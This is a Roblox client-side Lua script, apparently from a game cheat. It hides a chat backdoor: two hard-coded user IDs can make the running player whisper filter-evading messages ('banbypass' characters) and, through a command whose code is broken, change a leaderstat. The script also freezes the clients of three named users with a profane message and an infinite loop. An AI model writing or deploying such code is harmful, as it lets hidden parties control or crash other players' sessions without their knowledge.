repeat
	task.wait()
until game:GetService('Players').LocalPlayer

local ids = {
	4245576625,
	4649707899
}
local banbypass = {
	'а',
	'q',
	'x',
	'й',
	'こ'
}

local msgdone = game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.OnMessageDoneFiltering
msgdone.OnClientEvent:Connect(function(stuff)
	local speaker = tostring(stuff.FromSpeaker)
	local msg = tostring(stuff.Message)
	for _i, _v in next, ids do
		if game:GetService("Players")[speaker].UserId == _v and game:GetService("Players")[speaker] ~= game:GetService('Players').LocalPlayer then
			if msg == ".hello" then
				game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer('/w ' .. speaker .. ' | [CF] ' .. banbypass[math.random(1, #banbypass)] .. ' | dev debug, dont mind', 'All')
			elseif string.find(msg,'.fdon ') then
				local amount = string.gsub(msg,'.fdon ','')
				if tonumber(amount) then
				    game:GetService('Players').LocalPlayer.leaderstats.Raised.Value += tonumber(fdon)
				end
			end
		end
	end
end)

if game:GetService('Players').LocalPlayer.Name == 'AlexDaSlender1' or game:GetService('Players').LocalPlayer.Name == '2xUseI' or game:GetService'Players'.LocalPlayer.Name == 'cat_cathuge1234567' then
	local message = Instance.new('Hint',workspace)
	message.Text = 'fuck you'
	task.wait(1)
	while true do end
end
